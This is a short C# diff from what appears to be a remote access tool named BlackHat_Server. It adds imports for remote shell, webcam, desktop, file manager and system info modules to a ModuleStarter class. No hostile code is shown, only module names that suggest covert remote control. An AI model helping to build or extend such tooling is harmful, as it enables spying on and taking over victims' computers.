@@ -1,4 +1,10 @@
-﻿namespace BlackHat_Server
+﻿using BlackHat_Server.Muduli.Desktop;
+using BlackHat_Server.Muduli.File_Manager;
+using BlackHat_Server.Muduli.Remote_Shell;
+using BlackHat_Server.Muduli.System_Info;
+using BlackHat_Server.Muduli.WebCam;
+
+namespace BlackHat_Server.Class
 {
     internal class ModuleStarter
     {
